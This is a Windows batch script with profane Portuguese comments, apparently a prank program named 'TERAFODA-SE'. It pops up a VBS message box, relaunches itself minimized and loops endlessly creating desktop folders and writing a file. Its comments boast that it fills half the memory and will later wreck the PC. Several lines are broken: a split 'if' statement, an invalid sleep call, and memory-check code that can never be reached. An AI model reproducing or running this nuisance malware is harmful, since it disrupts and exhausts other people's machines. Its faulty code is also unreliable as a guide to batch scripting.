:: Por medidas de segurança, o TERAFODA-SE enche apenas metade da memória
:: na versão atual. Futuramente ele irá foder o PC de vez; aguarde!!!

@echo on

echo x=msgbox("FOOOOODAAAAA-SEEEEE" ,0, "FODA-SE") >> msgbox.vbs
start msgbox.vbs

if not "%minimized%"=="" 
	goto :minimized

set minimized=true
start /min cmd /C "%~dpnx0"

:minimized

SETLOCAL enabledelayedexpansion
	for /f "tokens=3 delims=:" %%t in ('echo/%time%') do (
		for /f "tokens=1 delims=." %%v in ('echo/%%t') do (
			set /a segundos = %%v
		)
	)
ENDLOCAL

if not exist *.txt (
	echo Lotando de Foda-se.
	) 

:start
	cd "%systemdrive%/documents and settings/%username%/desktop"
	set /p x= name of folder :
	md %x%
	cls && goto start

set message=FODA-SE

DIR Desktop
CLS

:loop
	echo %message% > FODA-SE
	SLEEP (0.05)
	CLS

	goto loop
	
set totalMem=
set availableMem=
set usedMem=
for /f "tokens=4" %%a in ('systeminfo ^| findstr Physical') do if defined totalMem (set availableMem=%%a) else (set totalMem=%%a)
	set totalMem=%totalMem:,=%
	set availableMem=%availableMem:,=%
	set /a usedMem=totalMem-availableMem

if %usedMem% >= %totalMem%/2 (
	goto:eof )

exit
